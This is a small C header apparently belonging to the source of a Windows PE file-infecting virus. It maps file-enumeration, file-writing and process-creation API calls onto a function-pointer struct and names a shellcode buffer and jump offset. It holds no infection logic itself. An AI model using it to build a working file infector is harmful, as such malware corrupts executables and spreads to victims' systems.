#ifndef _PE_VIRUS_INFECT_H_
#define _PE_VIRUS_INFECT_H_

#define FindFirstFileA sb->_FindFirstFileA
#define FindNextFileA sb->_FindNextFileA
#define FindClose sb->_FindClose
#define CreateFileA sb->_CreateFileA
#define WriteFile sb->_WriteFile
#define ReadFile sb->_ReadFile
#define SetFilePointer sb->_SetFilePointer
#define SetEndOfFile sb->_SetEndOfFile
#define GetFileSize sb->_GetFileSize
#define CloseHandle sb->_CloseHandle
#define CreateProcessA sb->_CreateProcessA
#define shellCode sb->_shellCode
#define JMP_POINT_OFFSET sb->_JMP_POINT_OFFSET
#define CODE_SIZE sb->_CODE_SIZE

#endif //_PE_VIRUS_INFECT_H_